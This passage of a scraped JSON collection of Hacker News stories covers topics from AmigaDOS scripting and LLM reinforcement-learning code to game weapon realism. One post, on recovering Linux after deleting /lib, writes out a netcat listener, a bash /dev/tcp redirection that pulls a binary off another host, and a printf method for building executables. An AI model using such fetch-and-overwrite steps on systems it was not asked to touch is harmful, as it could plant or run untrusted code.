Angeles Lakers vs Chicago Bulls Full Game Highlights - March 22, 2025 | NBA Regular Season\n\n    GAMETIME HIGHLIGHTS\n\n    GAMETIME HIGHLIGHTS\n\n  Verified\n\n    •\n\n    •\n\n      166K views\n\n      4 hours ago\n\n          New\n\n  2:33:02\n    2:33:02\n  Now playing\n\n            Graham Hancock: Lost Civilization of the Ice Age & Ancient Human History | Lex Fridman Podcast #449\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n    •\n\n    •\n\n      5.7M views\n\n      5 months ago\n\n  20:36\n    20:36\n  Now playing\n\n            The Russian Reach: Russia's Wish List Part 1 || Peter Zeihan\n\n    Zeihan on Geopolitics\n\n    Zeihan on Geopolitics\n\n  Verified\n\n    •\n\n    •\n\n      166K views\n\n      1 day ago\n\n          New\n\n  5:15:01\n    5:15:01\n  Now playing\n\n            Dario Amodei: Anthropic CEO on Claude, AGI & the Future of AI & Humanity | Lex Fridman Podcast #452\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n    •\n\n    •\n\n      1.4M views\n\n      4 months ago\n\n  6:58\n    6:58\n  Now playing\n\n            ThePrimeagen's top 5 programming languages | Lex Fridman Podcast Clips\n\n    Lex Clips\n\n    Lex Clips\n\n  Verified\n\n    •\n\n    •\n\n      18K views\n\n      10 hours ago\n\n          New\n\n  8:12\n    8:12\n  Now playing\n\n            Russia could be behind Heathrow shutdown | Former head of MI6 Russian desk\n\n    Times Radio\n\n    Times Radio\n\n  Verified\n\n    •\n\n    •\n\n      163K views\n\n      1 day ago\n\n          New\n\n  23:26\n    23:26\n  Now playing\n\n            Day 2 - VIBE CODING A GAME IN 7 DAYS\n\n    ThePrimeTime\n\n    ThePrimeTime\n\n  Verified\n\n    •\n\n    •\n\n      11K views\n\n      4 hours ago\n\n          New\n\n  3:42:21\n    3:42:21\n  Now playing\n\n            Gregory Aldrete: The Roman Empire - Rise and Fall of Ancient Rome | Lex Fridman Podcast #443\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n    •\n\n    •\n\n      5.6M views\n\n      6 months ago\n\n  20:25\n    20:25\n  Now playing\n\n            Tom Friedman: Trump Is a ‘Small Man in a Big Time’\n\n    New York Times Podcasts\n\n    New York Times Podcasts\n\n  Verified\n\n    •\n\n    •\n\n      51K views\n\n      3 days ago\n\n          New\n\n  19:32\n    19:32\n  Now playing\n\n            \"금요일 탄핵 선고 유력, 만장일치 인용 결정 나올 것\" 임지봉 서강대 법학전문대학원 교수 [시사스페셜-정운갑의 집중분석]\n\n    MBN News\n\n    MBN News\n\n  Verified\n\n    •\n\n    •\n\n      3.6K views\n\n      48 minutes ago\n\n          New\n\n  2:23:05\n    2:23:05\n  Now playing\n\n            Jordan Peterson: Nietzsche, Hitler, God, Psychopathy, Suffering & Meaning | Lex Fridman Podcast #448\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n    •\n\n    •\n\n      1.5M views\n\n      5 months ago\n\n  8:59\n    8:59\n  Now playing\n\n            Youtuber Charged with Attempted Murder\n\n    penguinz0\n\n    penguinz0\n\n  Verified\n\n    •\n\n    •\n\n      724K views\n\n      7 hours ago\n\n          New\n\n  2:29:05\n    2:29:05\n  Now playing\n\n            Cursor Team: Future of Programming with AI | Lex Fridman Podcast #447\n\n    Lex Fridman\n\n    Lex Fridman\n\n  Verified\n\n    •\n\n    •\n\n      673K views\n\n      5 months ago\n\n  25:54\n    25:54\n  Now playing\n\n            Putin forced to play for time in talks as crucial offensives miss targets\n\n    Times Radio\n\n    Times Radio\n\n  Verified\n\n    •\n\n    •\n\n      49K views\n\n      15 hours ago\n\n          New\n\nShow more",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2a9c1e6024029864",
    "title": {
      "en": "Bra and KET: String Interpolation in AmigaDOS",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.datagubbe.se/braket/",
    "score": 62,
    "by": "ingve",
    "time": 1742663122,
    "content": "BRA and KET: String Interpolation in AmigaDOS\n\nExploring the unnecessary, part 3735928559\nSpring 2025\n\nA Short Word on AmigaDOS Scripts\n\nWithout getting caught up in semantics, AmigaDOS in this text refers to the command line portion of the Amiga computers' operating system. AmigaDOS is based on TRIPOS, but was expanded and added to by both the original Amiga team and then Commodore. One thing that remains basically the same is the parser for shell scripts, or sequence files as they're called in TRIPOS. The script parser is reasonably competent for a 1980:s home computer OS and can be used for solving real world made up programming problems.\n\nThe parser accepts a few special directives, such as .KEY, which is used to describe the template for arguments passed to the script file. For example, .KEY FILENAME/A tells the parser that the script accepts a string argument called FILENAME. These directives are placed at the start of the script file.\n\nBy default, the parser does string interpolation using the characters < (less than) and > (greater than). The cleverness of this is debatable: these characters are also used for I/O redirection, which can quickly make things confusing. Luckily, the parser also accepts the directives .BRA and .KET, each followed by a single character, which lets the programmer override the default interpolation characters. The terms BRA and KET are most likely borrowed from Dirac notation.\n\nA Simple Example\n\nUsually, AmigaDOS scripts using interpolation replace the default characters with curly braces, { and }, respectively. This trend may have originated at Commodore. Consider the following script:\n\n.BRA {\n.KET }\n.KEY var\nEcho Hello {var}!\n\nHere, < and > have been substituted with { and }. The script takes a single argument, var, and the string interpolation then replaces {var} with the supplied argument. If saved as the file myscript and executed, the following AmigaShell session can be achieved:\n\nAmigaShell> myscript datagubbe\nHello datagubbe!\nAmigaShell> _\n\nInterpolate This!\n\nThis of course begs the question: What characters can be used for string interpolation in shell scripts? Thanks to the tireless efforts of talented researchers at Datagubbe Labs, an answer can be presented - and programmers worldwide can finally get a good night's sleep. Without further ado, let's get down to brass tacks!\n\nTest Tooling\n\nThere are text editors on the Amiga that'll happily insert any ASCII character into a text file, but why use an existing solution when you can build your own? An ARexx program - makescript - was quickly hacked together meticulously constructed for the purpose. This program generates an AmigaDOS script file with arbitrary characters for .BRA and .KET, supplied either as plain text or ASCII char codes. The source code for makescript is available here.\n\nBread and Butter\n\nThe defaults and the standard curly substitutes both work very well, as expected. Datagubbe Labs has taken the liberty of preparing screenshots, to further emphasize the validity and rigor of this important research. The scripts can also be downloaded, for transparency and reproducibility. Witness:\n\n  Default (no .BRA/.KET directives)\n  Standard (curly braces)\n\nOdds and Alphas\n\nWhat about non-matching character pairs, such as [ and }? That works, too, which was expected. As does standard letters, such as A and B.\n\n  Odd pair ([ and })\n  Letters (A and B)\n\nBells and Whistles\n\nFinally, non-printable characters were introduced. First, shift out (SO, decimal char code 14) and shift in (SI, decimal char code 15) were tested. These worked, too. Then, upping the ante, our relentless researchers decided to try the ASCII BEL character (decimal char code 7). AmigaDOS handles the BEL character by flashing the screen when it's encountered in a text. How would this fare in script execution? For closing the interpolation, negative acknowledgement (NAK, decimal char code 21), was chosen. This too, proved to work flawlessly - and no screen flashing was encountered when executing the script.\n\n  Shift In and Shift Out\n  BEL and NAK\n\nAnother Job Well Done\n\nNaturally, when printing the script file contents to the shell window using the AmigaDOS command Type, these characters cause a bit of commotion. BEL, for example, results in a screen flash as expected. In order to verify that the characters are indeed present in the script files, feel free to download them above - or study this screenshot of MicroEMACS, displaying the non-printable characters as control sequences.\n\nIn conclusion, AmigaDOS string interpolation offers both resilience and a wide variety of choice - a cause for celebration as good as any. Thanks for your attention, and happy hacking!",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3b71d292b6cc3d6b",
    "title": {
      "en": "California Attorney General issues consumer alert for 23andMe customers",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://oag.ca.gov/news/press-releases/attorney-general-bonta-urgently-issues-consumer-alert-23andme-customers",
    "score": 377,
    "by": "thoughtpeddler",
    "time": 1742666138,
    "content": "Subscribe to Our Newsletter\n\n          Subscribe\n\n            Subscribe",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a96318bdaefb2545",
    "title": {
      "en": "Optimizing Brainfuck interpreter in the C preprocessor",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/camel-cdr/bfcpp",
    "score": 37,
    "by": "namanyayg",
    "time": 1742510047,
    "content": "Optimizing Brainfuck interpreter in the C preprocessor\n\nA C99 confirming* optimizing Brainfuck implementation written (and executed) only using the C preprocessor.\n*If you find something that does not confirm to the standard or is unspecified/undefined, please open an issue.\nExample\nHello WorldOutput\n#include \"bf.c\"\n\nBF(,I,I,I,I,I,I,I,I,B,R,I,I,I,I,B,R,I,I,R,I,I,\n    I,R,I,I,I,R,I,L,L,L,L,D,E,R,I,R,I,R,D,R,R,\n    I,B,L,E,L,D,E,R,R,A,R,D,D,D,A,I,I,I,I,I,I,\n    I,A,A,I,I,I,A,R,R,A,L,D,A,L,A,I,I,I,A,D,D,\n    D,D,D,D,A,D,D,D,D,D,D,D,D,A,R,R,I,A,R,I,I,A)\n\n\"Hello\\x20World!\\n\"\n\nMultiplication (0xc*0xa)Output (0xc*0xa=0x78)\n#include \"bf.c\"\n\nBF((c,a),G,R,G,L,B,R,B,D,R,I,R,I,L,L,E,R,\n         R,B,D,L,L,I,R,R,E,L,L,L,D,E,R,R,O)\n\n\"(78)\"\n\nCheck out examples.c for more examples.\nGetting started\nSince the preprocessor can't distinguish between the standard Brainfuck symbols, this implementation uses the following alternative instruction names:\n\nOriginal\nInstruction\nDescription\n\n>\nR\nMove the tape head to the right\n\n<\nL\nMove the tape head to the left\n\n+\nI\nIncrement the tape head\n\n-\nD\nDecrement the tape head\n\n.\nA\nOutput the tape head as ASCII*\n\nO\nOutput the tape head as a hexadecimal number\n\n,\nG\nRead an input character and set the tape head to it\n\n[\nB\nJump past the matching ] if the cell at the pointer is 0\n\n]\nE\nJump back to the matching [ if the cell at the pointer is nonzero\n\n*Note that there might be extra space inserted between symbols, because all preprocessors I know of disagree when spaces are inserted in S(a)b with #define S(x) x and different tokens in a and b.\nPreprocessors/Compilers\n\ntcc: use with tcc -P -E. tcc has the fastest preprocessor I know of.\ngcc: use with gcc -P -E -ftrack-macro-expansion=0. If you can't use tcc I recommend using gcc over clang, because it's faster, and gives you incremental output.\nclang: use with clang -P -E -fmacro-backtrace-limit=1.\nmsvc: use with cl /P /C /Zc:preprocessor. You need /Zc:preprocessor, because otherwise msvc will use a non-standard confirming preprocessor implementation.\nmcpp: use with mcpp -P -W0. -W0 is required, because the otherwise you'll get the warning \"Replacement text ... of macro ... involved subsequent text\", which is valid, but mcpp warns about it, because in \"normal\" code this is probably not indented behavior. There is also currently a mcpp bug, where the add lookup table segfaults the preprocessor, so you'll need to disable BF_SUM for mcpp to preprocess the code.\n\nIf you want to get more fine grain information of execution times, then you might want to patch tcc with tinycc.diff.\nThis adds the __TIMER__ macro, which expands to the executed time and resets the timer, so the second __TIMER__ in __TIMER__ FOO __TIMER__ expands to the time it took to preprocess FOO.\nHow does this work?\nCheck out the tutorial, if you want to learn how I wrote this.\nBenchmarks with similar projects\nThe programs tested are also present in examples.c.\n\nProgram\nbfcpp\nbfi\nCPP_COMPLETE\npreprocessor_brainfuck\n\nHello World\n0.020s\n0.048s\n23s\n~20 minutes\n\ninsertion sort 1\n0.049s\n0.11s\n---\n---\n\ninsertion sort 2\n0.09s\n0.22s\n---\n---\n\ninsertion sort 3\n0.75s\n1.7s\n---\n---\n\ninsertion sort 4\n2.15s\n5.1s\n---\n---\n\nsierpinski triangle\n5.32s\n6.6s\n---\n---\n\nsquare numbers from 0 to 10000\n10.90s\n11.45s\n---\n---\n\nquine\n29.62s\n283.3s\n---\n---\n\nCredit\nThanks to notfoundry and Jad Lévesque for helping me understand preprocessor meta programming.\nAlso, thanks to bfi, for the idea of the addition lookup table and a big motivation to further optimize my implementation.\nLicensing\nFor all files without an integrated license LICENSE applies.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2faa9e49893d33b8",
    "title": {
      "en": "Understanding R1-Zero-Like Training: A Critical Perspective",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/sail-sg/understand-r1-zero",
    "score": 117,
    "by": "pama",
    "time": 1742654112,
    "content": "Understanding R1-Zero-Like Training: A Critical Perspective\n\n    🎉 Updates •\n    🔗 Links •\n    📖 TL;DR\n\n    💻 Usage  •\n    🍊 Citation •\n    🌻 Acknowledgement\n\nUpdates\n\n21/03/2025: 🎉 We release our paper, models and codebase. Our R1-Zero training is implemented with 🌾 Oat, a highly modular, research-friendly and efficient LLM RL framework.\n\nLinks\n\nUnderstanding R1-Zero-Like Training\n\n📄 Paper\n🤗 Models\n\nThere May Not Be Aha Moment in R1-Zero-like Training — A Pilot Study\n\n📄 Blog\n💻 Code\n\nOAT: A research-friendly framework for LLM online alignment\n\n💻 Codebase\n\nTL;DR\nTo understand R1-Zero-like training, we critically examine two core components: base models\nand reinforcement learning. We highlight our findings below.\nOn base models:\n\nDeepSeek-V3-Base already exhibit \"Aha moment\".\n\nAs the popular choice for R1-Zero-like training, Qwen2.5 base models demonstrate strong reasoning capabilities\neven without prompt templates: the average benchmark scores improve by ~60% (compared to the traditional 4-shot prompting)!\n\nOn reinforcement learning:\n\nGRPO leads to biased optimization! We propose a simple fix that improves token efficiency\nwhile maintaining reasoning performance, termed as Dr. GRPO (GRPO Done Right).\n\nIn R1-Zero-like training, the template and the question set perform a duet to affect the RL dynamics\n\n(Left Plot) For Qwen2.5-Math-1.5B, a mismatched template (e.g., R1 template) in fact destructs the reasoning capabilities before RL reconstructing it. This makes the improvement impressive on the surface.\n(Middle Plot) However, if a template does not deviate from the pretraining distribution too far, even a small and completely o.o.d. question set (e.g., GSM8K) could induce the reasoning ability equally well, by reinforcing correct reasoning behaviors instead of infusing new knowledge.\n\nBeyond Qwen, Llama can also be RL-tuned from base models. In this case, domain-specific pretraining will improves RL ceiling.\n\n(Right Plot) GRPO can even make Llama with math knowledge \"Aha\" by increasing the output length; however, it is likely due to its length bias, which can be removed by Dr. GRPO.\n\nOur minimalist R1-Zero recipe:\nOur analysis suggests a minimalist recipe for R1-Zero-like training:\nWe RL-tune Qwen2.5-\nMath-7B using the (unbiased) Dr. GRPO algorithm on MATH level 3-5 questions with the Qwen-Math template, and achieve state-of-the-art performance with only 27 hours compute on 8× A100 GPUs.\n\nIf you are interested in more details, please check out our paper!\nUsage\nInstall\nWe recommend a clean python==3.10 environment for development.\n# Install vllm & oat, the LLM RL framework we developed r1-zero training on.\npip install vllm==0.7.2 && pip install oat-llm==0.0.9\n\n# Install this package locally to use the math grader.\ngit clone git@github.com:sail-sg/understand-r1-zero.git && cd understand-r1-zero\npip install -e .\n\nTraining\nWe implement R1-Zero training by extending Oat's Learner and Actor components. Please see train_zero_math.py for a step-by-step guide.\n# Patch LD_LIBRARY_PATH to avoid dependency errors:\nexport LD_LIBRARY_PATH=$(python -c \"import sysconfig; print(sysconfig.get_config_var('LIBDIR'))\"):$LD_LIBRARY_PATH\n\n# Run the experiment (tested on 8 x A100-40G) with Dr. GRPO:\n# (change to `--critic_type grpo` for running GRPO)\npython train_zero_math.py \\\n    --critic_type drgrpo \\\n    --gpus 8 \\\n    --enable_prefix_caching \\\n    --collocate \\\n    --vllm_sleep \\\n    --vllm_gpu_ratio 0.35 \\\n    --gradient-checkpointing \\\n    --flash-attn \\\n    --bf16 \\\n    --rnd-seed \\\n    --learning_rate 0.000001 \\\n    --lr_scheduler constant \\\n    --num_ppo_epochs 1 \\\n    --beta 0 \\\n    --oracle_type reward \\\n    --oracle math \\\n    --pretrain Qwen/Qwen2.5-Math-1.5B \\\n    --prompt_template r1 \\\n    --zero-stage 2 \\\n    --ref_offload \\\n    --prompt_data ./datasets/train/math_12k \\\n    --train_split train \\\n    --input_key problem \\\n    --output_key answer \\\n    --max-train 9999999 \\\n    --num_prompt_epoch 20 \\\n    --prompt_max_length 1024 \\\n    --num_samples 8 \\\n    --temperature 1 \\\n    --top_p 1 \\\n    --generate_max_length 3000 \\\n    --save_steps -1 \\\n    --train_batch_size 128 \\\n    --rollout_batch_size 128 \\\n    --rollout_batch_size_per_device 16 \\\n    --pi_buffer_maxlen_per_device 128 \\\n    --eval_batch_size 200 \\\n    --eval_steps 16 \\\n    --eval_temperature 0 \\\n    --eval_generate_max_length 3000 \\\n    --eval_data ./datasets/evaluation_suite \\\n    --eval_input_key input \\\n    --use-wb \\\n    --wb-run-name qwen2.5-Math-1.5b-r1-zero \\\n    --wb_project oat-zero\n\nPlease see here for more example scripts.\nEvaluation\n# Evaluate our models:\npython evaluate_model.py --model_name sail/Qwen2.5-Math-7B-Oat-Zero\npython evaluate_model.py --model_name sail/Qwen2.5-Math-1.5B-Oat-Zero\npython evaluate_model.py --model_name sail/Llama-3.2-3B-Oat-Zero --template r1\n\n# Evaluate baseline models:\npython evaluate_model.py --model_name Qwen/Qwen2.5-Math-1.5B\npython evaluate_model.py --model_name Qwen/Qwen2.5-Math-7B\npython evaluate_model.py --model_name hkust-nlp/Qwen-2.5-Math-7B-SimpleRL-Zero\npython evaluate_model.py --model_name PRIME-RL/Eurus-2-7B-PRIME-Zero\npython evaluate_model.py --model_name Open-Reasoner-Zero/Open-Reasoner-Zero-7B\n\nCitation\nIf you find our work useful for your research, please consider citing:\n@misc{liu2025understanding,\n  title={Understanding R1-Zero-Like Training: A Critical Perspective},\n  author={Zichen Liu and Changyu Chen and Wenjun Li and Penghui Qi and Tianyu Pang and Chao Du and Wee Sun Lee and Min Lin},\n  year={2025},\n  howpublished={\\url{https://github.com/sail-sg/understand-r1-zero}},\n}\n\nAcknowledgement\n\nThis work is supported by Sea AI Lab for computing resources.\nThe training codes are built on Oat, which employs vLLM, DeepSpeed and launchpad.\nThe base models are from Qwen2.5-Math, Llama, and DeepSeek.\nWe thank Qingfeng Lan for his time in thoroughly reviewing our code.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "34680cd787affb42",
    "title": {
      "en": "Scallop – A Language for Neurosymbolic Programming",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.scallop-lang.org/",
    "score": 207,
    "by": "andsoitis",
    "time": 1742618708,
    "content": "Neurosymbolic Programming with Scallop\n\n            Install\n            Tutorial\n\nLanguage\n\n                  Scallop is a declarative language designed to support rich symbolic reasoning in AI applications.\n\t\t  It is based on Datalog, a logic rule-based query language for relational databases.\n\n                Solver\n\n                  Scallop is a scalable Datalog solver equipped with support for discrete, probabilistic, and\n                  differentiable modes of reasoning.\n                  These modes are configurable to suit the needs of different AI applications.\n\n                Framework\n\n                  Scallop provides bindings to support logic reasoning modules within Python programs.\n                  As a result, Scallop can be deeply integrated with existing PyTorch machine\n                  learning pipelines.\n\nWide Range of Applications\n\n              Scallop can be used to develop a wide variety of applications in vision and NLP that involve symbolic reasoning.\n              The reasoning component is specified via logic rules which can then be deeply\n              integrated with machine learning models, such as convolutional neural networks and transformers.\n\nCLEVR, Compositional Language and Elementary Visual Reasoning\nThis task concerns reasoning about simple 3D objects in a given image in order to\nanswer questions such as \"how many objects are colored blue?\".\nTo express this task in Scallop, we use neural components to generate a symbolic\nrepresentation of the image, in the form of a scene graph, as well as a\nprogrammatic query to represent the question.  On the other hand, the reasoning\ncomponent specifies various operations such as selecting, comparing, and counting\nobjects with the specified attributes.\nScallop enables to integrate all of these components in a common framework\nand perform training in an end-to-end fashion.\ntype Color = RED | GREEN | BLUE\ntype Size = LARGE | SMALL\ntype Expr = Scene() | Color(Color, Expr) | Size(Size, Expr) | Count(Expr)\n\n// Programmatic query evaluator\nrel eval(e, output_obj) = case e is Scene(), input_obj_ids(output_obj)\nrel eval(e, output_obj) = case e is Color(c, e1), eval(e1, output_obj), input_obj_color(output_obj, c)\nrel eval(e, output_obj) = case e is Size(s, e1), eval(e1, output_obj), input_obj_size(output_obj, s)\nrel eval_num(e, n) = n := count(o: eval(e1, o) where e1: case e is Count(e1))\nrel result(n) = root(e) and eval_num(e, n)\n\n// Scene Graph\nrel input_obj_ids = {0, 1}\nrel input_obj_color = {(0, RED), (1, GREEN)}\nrel input_obj_size = {(0, LARGE), (1, SMALL)}\n\n// Count how many large red objects\nconst MY_QUERY = Count(Color(RED, Size(LARGE, Scene())))\nrel root(MY_QUERY)\n\nPathfinder, Long Range Connectivity Reasoning\nIn this task, we are provided with black-and-white images containing two dots\nand dashed lines.\nThe goal is to determine whether the two dots are connected by a dashed line.\nThis task can be programmed in just a few lines in Scallop using a\nvery simple neural architecture for detecting dots and dashes, together with\nthe logic rules below, and outperforms state-of-the-art transformers.\nrel path(x, y) = dash(x, y)\nrel path(x, y) = path(x, z), dash(z, y)\nrel is_connected() = dot(x), dot(y), path(x, y), x != y\n\nEvaluating Hand-Written Formulae\nIn this task, we are given a sequence of hand-written symbols, including 0 to 9\nand simple arithmetic operations.\nThe goal is to recognize the formula and evaluate the expression.\nIn the adjoining example, the input represents the formula 1 + 3 / 5, which\nevaluates to 1.6.\nOne can craft a full context-free grammar parser in Scallop that can parse\nprobabilistic inputs.\nA parser and evaluator for the above formulae can be written in just 5 lines\nof Scallop code shown below.\nThis program can be trained in an end-to-end fashion with the neural model\nfor recognizing individual symbols.\nOnce trained, the resulting program will automatically find the most likely\nformula and return the evaluated result.\ntype symbol(index: usize, symbol: String)\ntype length(n: usize)\n\nrel digit = {\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"}\n\nrel factor(x as f32, b, b + 1) = symbol(b, x) and digit(x)\nrel mult_div(x, b, r) = factor(x, b, r)\nrel mult_div(x * y, b, e) = mult_div(x, b, m) and symbol(m, \"*\") and factor(y, m + 1, e)\nrel mult_div(x / y, b, e) = mult_div(x, b, m) and symbol(m, \"/\") and factor(y, m + 1, e)\nrel add_minus(x, b, r) = mult_div(x, b, r)\nrel add_minus(x + y, b, e) = add_minus(x, b, m) and symbol(m, \"+\") and mult_div(y, m + 1, e)\nrel add_minus(x - y, b, e) = add_minus(x, b, m) and symbol(m, \"-\") and mult_div(y, m + 1, e)\n\nrel result(y) = add_minus(y, 0, l) and length(l)",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "115bd37799a4b693",
    "title": {
      "en": "Stop using the elbow criterion for k-means",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arxiv.org/abs/2212.12189",
    "score": 9,
    "by": "Anon84",
    "time": 1742698298,
    "content": "A major challenge when using k-means clustering often is how to choose the parameter k, the number of clusters. In this letter, we want to point out that it is very easy to draw poor conclusions from a common heuristic, the \"elbow method\". Better alternatives have been known in literature for a long time, and we want to draw attention to some of these easy to use options, that often perform better. This letter is a call to stop using the elbow method altogether, because it severely lacks theoretic support, and we want to encourage educators to discuss the problems of the method -- if introducing it in class at all -- and teach alternatives instead, while researchers and reviewers should reject conclusions drawn from the elbow method.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "338962ecabfcc9a6",
    "title": {
      "en": "When you deleted /lib on Linux while still connected via SSH (2022)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://tinyhack.com/2022/09/16/when-you-deleted-lib-on-linux-while-still-connected-via-ssh/",
    "score": 146,
    "by": "todsacerdoti",
    "time": 1742628245,
    "content": "When you deleted /lib on Linux while still connected via ssh\n\nLet’s first not talk about why this can happen, but deleting /lib, /usr/lib, or some other essential runtime files happens quite a lot (as you can see: here, here, here, and here). In this post, I will only discuss what happens when you delete /lib on Linux and how to recover from that.\n\nThe easy solution for everything is to replace the missing files, but this can be difficult if /lib is deleted because we won’t have ld-linux, which is needed to run any dynamic executable. When you deleted /lib, all non-static executable (such as ls, cat, etc, will output):\n\n1No such file or directory\n\nYou will also be unable to open any new connection using ssh, or open a new tmux window/pane if you are using tmux. So you can only rely on your current shell built in, and some static executables that you have on the system.\n\nIf you have a static busybox installed, then it can be your rescue. You can use wget from busybox to download libraries from a clean system.  For your information: Debian has busybox installed by default, but the default is not the static version.\n\nMinimal Debian install\n\nIf you are worried that this kind of problem might happen to you in the future: Install the static version of the busybox binary, and confirm that it is the correct version.\n\nInstalling static busybox\n\nBash to the rescue\n\nI assume right now that you don’t have a static busybox, and you don’t even have any static executables (which is the situation in many cases, like in the default install of minimal Debian). My solution for this is to download a static busybox from another machine.\n\nI also assume that you have bash installed (which is the default for most systems).  Bash has a lot of default built-ins that we can use.  There is a solution from here that can be used to download a file using only built-in bash functions. Other solutions on this thread rely on external command (such as cat).  Please note that you need to set the environment  variable LANG to C; Otherwise, this script will incorrectly handle Unicode bytes.\n\nOf course, we can’t chmod the destination file to be executable, so we need to overwrite an existing executable. If you have busybox installed (even if it is the non-static version), you can overwrite this file. At this point, you can start the rescue mission: for example, use wget to download fresh /lib from another system.\n\nPlease note that busybox can’t function with a name that is not a busybox applet name. So if you overwrite for example, the fmt binary with busybox, then it won’t work (it will say: applet not found).  If you don’t have busybox, I suggest overwriting cp, then you can use cp to create a copy of cp as busybox (which will be executable).\n\ncp to busybox\n\nNo bash? printf can help\n\nIf you have a more advanced shell (e.g: zsh), it has TCP modules already built in. You can easily use nc from another machine to send a file to the target machine. Now, let’s assume that you have a very basic shell, for example: dash. Most shell  (including dash), has printf as built-in, and we can use this to construct binary files.\n\nMost (all?) shell’s built-in  printf implementation supports \\ooo where ooo  is 3 digit octal. First approach is to just convert busybox, but this file is quite big (2 megabyte). Copy-pasting  large printf commands is tedious and is error-prone. We need a small static binary that can help us.\n\nThis printf trick will also work for other OS, if you can create a small binary for that OS.\n\nCreating a small ELF for Linux\n\nYou can create a very tiny executable if you use assembly directly, but let’s try to do this using C, so it can be portable across different architectures. The smallest useful program that I can think of is just to copy from stdin to stdout, so we can prepare netcat on a machine:\n\ncat busybox | nc -v -l -p 10000\n\nand then we can do this from the borked machine:\n\nfdio < /dev/tcp/192.168.1.168/10000 > busybox\n\nThe source code can be like this:\n\n12345678910111213#include \"unistd.h\"int main(){char x;while (1) {int c = read(0, &x, 1);if (c!=0) break;c = write(1, &x, 1);if (c!=0) break;}return 0;}\n\nIf we try to compile this with standard C library (on AMD64 machine), the result is 776KB.\n\n$ gcc -Os -static fd.c\n$ du -hs a.out\n768K    a.out\n\nThe Linux kernel source code contains a nolibc implementation that we can use. Using this compilation option:\n\ngcc -Os -Wl,--build-id=none -fno-asynchronous-unwind-tables -fno-ident -s -nostdlib -nodefaultlibs -static -include nolibc.h fd.c -lgcc -o fd\n\nWe get a 4536 bytes binary. Quite good. If we add -z max-page-size=0x04, we can even get a smaller size.\n\ngcc -Os -Wl,--build-id=none -z max-page-size=0x04 -fno-asynchronous-unwind-tables -fno-ident -s -nostdlib -nodefaultlibs -static -include nolibc.h fd.c -lgcc -o fd\n\nIt is now 672 bytes. Small enough to transfer. We can convert this using Python.\n\n12345678910111213141516171819import syswith open(sys.argv[1], \"rb\") as f:data = f.read()start = 0width = 20targetname = sys.argv[2]while True:part = data[start:start+width]if part=='':breaka = ''.join(['\\\\'+(oct(ord(i)).zfill(3))[-3:] for i in part])dest = '>'if start>0:dest += '>'dest += ' ' + targetnameprint(\"printf '{}' {} \".format(a, dest))start += width\n\nWe can then copy paste this to our ssh session, then do the /dev/tcp redirection trick.\n\nOutput example\n\nOf course, we can also write a complete program that makes the TCP connection instead of relying on bash redirection.\n\nI hope you will never need this knowledge\n\nThis problem occurred to me a few days ago when I updated my Solar Powered Pi Zero, and somehow /lib got deleted (not sure what caused it). This is not a very important machine, and I could have just reimaged the MicroSD card and be done with it, but I was curious if I could recover from the error.\n\nI hope you will never have this error on your production/important machine, but if you have this problem in the future, I hope this post will help you recover from the situation.\n\n\t\tAuthor  adminPosted on September 16, 2022September 16, 2022Categories debian, hacks, linux",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "27b2b887ce228a79",
    "title": {
      "en": "Magical Instant Bullets",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://militaryrealism.blog/2025/03/20/magical-instant-bullets/",
    "score": 58,
    "by": "baud147258",
    "time": 1742507720,
    "content": "Unreal Tournament weapons: Part 3\n\nMarch 20, 2025\n\n12 minutes\n\nWelcome back, my new and regular readers alike. I’m doubling down on Unreal Tournament this week, following on from last week’s discussion of the Flak Cannon.If you need to get up to speed on Unreal Tournament (UT) you should read my previous posts on the game: Firstly on the Rocket Launcher, then the Flak Cannon. Today we’ll examine the Sniper Rifle with our usual pedantic criticism.\n\nAlthough the Sniper Rifle is one of the least sci-fi of the UT weapons, its effects are less plausible than the Rocket Launcher and the Flak Cannon. We’ll go through what these implausibilities are, as well as the reasons for them. This ties into how video games are designed and built: dissecting weapons like the UT Sniper Rifle allows us to take a look under the hood of the game and get an insight into the choices and limitations facing designers, especially with older games like UT.\n\nAs always, if you enjoy this post, I would appreciate if you shared it with like-minded nerds and pedants. If you haven’t subscribed yet, please do so using the link below so that you never miss a post. And finally, please weigh in in the comments section below with your own thoughts, especially if I’ve missed things. Hope you enjoy!\n\n\t\t\t\t\t\t\t\tType your email…\n\n\t\t\t\t\t\t\t\tSubscribe\n\n<< Flak Cannons and shotgunsTBC >>\n\n“Facing Worlds” is a video game classic…\n\nIt’s impossible to talk about Unreal Tournament’s Sniper Rifle without talking about one of its most iconic maps: Facing Worlds. Widely acknowledged as one of the genre’s best, it is a small, open, capture the flag1 map:\n\nThe map consists of two towers connected by a walkway and suspended in orbit above an Earth-like planet. It’s an exquisite setting, albeit with a quarter of a century less computer graphics development. The beauty of the setting is accentuated by the haunting soundtrack.\n\nAll of this beauty is, of course, merely a backdrop for the epic Sniper Rifle duels which the map is well-known for. Each tower provides about a dozen spots where you have an unobstructed view of the enemy tower and the route the enemy need to traverse to get to your tower. This makes sniping a guaranteed high-impact strategy: there’s no alternative but to walk onto the “sniper highway” that is the bridge connecting the towers. Of course the challenge is that while the towers give great vantage points, they don’t offer much 